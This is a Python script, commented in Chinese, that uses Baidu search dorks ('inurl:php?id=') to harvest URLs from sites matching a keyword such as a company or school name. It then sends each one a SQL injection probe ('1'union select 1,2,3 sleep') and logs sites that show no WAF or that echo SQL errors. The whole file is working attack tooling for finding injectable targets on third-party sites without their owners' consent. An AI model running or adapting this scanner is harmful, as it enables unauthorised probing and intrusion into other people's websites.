import requests
import re
from selenium import webdriver
import time
class Scanner():
  def __init__ (self):
      self.sqlable_result=[]
      self.all_result = []
  def request(self,url,option):
      req = webdriver.Chrome(chrome_options=option)
      req.get(url)
      print("请稍等...")
      time.sleep(3)
      return req
  def sql_inject_test(self,req_url):             #检测是否存在sql注入，该方法目前不完善,依靠提交'参数并检查状态码和回显有无error字样(其实错报率高),往后希望能加入'后内容长度对比更加精确
      reqreq = req_url + "1%27union%20select%201,2,3%20sleep"
      try:
         self.all_result.append(req_url+"\n")
      except:
          pass
      #print(reqreq)
      try:
          req = requests.get(reqreq)  # 关键字以及单引号,进行waf testing  (此处没有考虑到数字型注入)
          if (req.status_code == 200):
              a="[+]" + req_url + "   似乎没有waf"+"\n"
              self.sqlable_result.append(a)
              print("[+]" + req_url + "   似乎没有waf")

          sql_echo = re.search("error",req.text).group()

          if sql_echo != '':
              a="[*]" + req_url + "    出现sql报错回显"+"\n"
              self.sqlable_result.append(a)
              print("[*]" + req_url + "    出现sql报错回显")
      except:
          pass
if (__name__=="__main__"):
    option = webdriver.ChromeOptions()
    option.add_argument("headless")

    req_keyword = input("请输入关键字：(公司，学校等)")
    req_canshu = "%20inurl:php?" + input("请输入参数名（形如id=1的'id'）") + "=*"
    url = "https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&tn=monline_4_dg&wd=" + req_keyword + req_canshu + "&oq=url%25E7%25BC%2596%25E7%25A0%2581%2520python%2520hashlib&rsv_pq=d262a7e3000c1778&rsv_t=99a6DBnmxniCN92W6SJyfCYL6KsLqDLmN2lIgYdsj8C2fYmVY7xD9Su45ltjUzL7voLU&rqlang=cn&rsv_enter=1&inputT=652&rsv_sug3=84&rsv_sug1=51&rsv_sug7=000&rsv_sug2=0&rsv_sug4=151885&rsv_sug=1"
    # print(req_baidu)   OK
    SC = Scanner()
    page=1
    page_max=int(input("你想测试多少页？"))

    while page<=page_max:
      if page==1:
          conw = SC.request(url, option)
      else:
          conw = SC.request(next_page_ur, option)       #这红标没关系的
      word = conw.find_elements_by_class_name("c-showurl")
      next_page_ur=conw.find_elements_by_class_name("n")[0].get_attribute('href')#下一页
      t=1
      while t <= 10:
         try:
             baidu_url = word[t-1].get_attribute('href')
             req_benti=requests.get(baidu_url)
             req_source = req_benti.content.decode(errors='ignore')  # err是python3特有奇葩错误
             req = re.search("href.*?(?<!api/shortcut.php)\?.*?id=.*?\"", req_source).group()
             real=req_benti.url     #真实url

         except AttributeError as f:
            try:
               baidu_url = word[t - 1].get_attribute('href')
               req_benti = requests.get(baidu_url)
               real = req_benti.url
               req_source = req_benti.content.decode(errors='ignore')  # err是python3特有奇葩错误
               req = re.search(".*?(?<!api/shortcut.php)\?.*?id=.*?\"", req_source).group()  #避免匹配到api页
            except AttributeError:
               req=""
               real ="haven't param name 'id'"
         except :    #连接出错，网站不存在
            req = ""
            real =""
            print("第" + str(t) + "个结果：" + "connection failed")
            t = t + 1
            print("*********************************************************************************************")
            pass

        #req=re.search("#http://.*?id=",req).group()

         words = re.split("href", req)    #
         kee=len(words)                   #
         req=words[kee-1]                 #由于有可能匹配了多个href在一条连接，这三行是为了取出真正带id=参数的链接
         req=req.lstrip("=")
         try:
           k=real.split("/")
           if len(k)>=2:
              real=k[0]+"//"+k[2]
           else:
              real=real
         except:
           pass
         try:
            serc=re.search("http.*.id=\d+", req).group()
            req=serc
         except:
            serc=''
         if serc=='':                                #又可能匹配到不完整url（相对路径url），进行补全
              req = real+req                        #
         real=re.sub("\"","",real)

         req=re.sub("\"","",req)

         req=re.sub("	","",req)                     #
         req = re.sub("	", "", req)                   #
         req = re.sub("url:", "", req)               #
         req = re.sub(" ", "", req)                  #经验里需要过滤的字符，需要补充完善
         words = re.split("http", req)               #
         kee = len(words)                            #
         req = "http"+words[kee - 1]                 #有的还是有很多行http，取最后

         if req!='':
            SC.sql_inject_test(req)
         print("第" + str(t) + "个结果："+"source:"+real+"      ###     result:"+ req)
         print("*********************************************************************************************")
         t = t + 1

      SC.sqlable_result=set(SC.sqlable_result)
      with open('hello_sql.txt', "w") as f:
          f.writelines(SC.sqlable_result)
      f.close()

      SC.all_result = set(SC.all_result)
      with open('all.txt', "w") as f:
          f.writelines(SC.all_result)
      f.close()
      page=page+1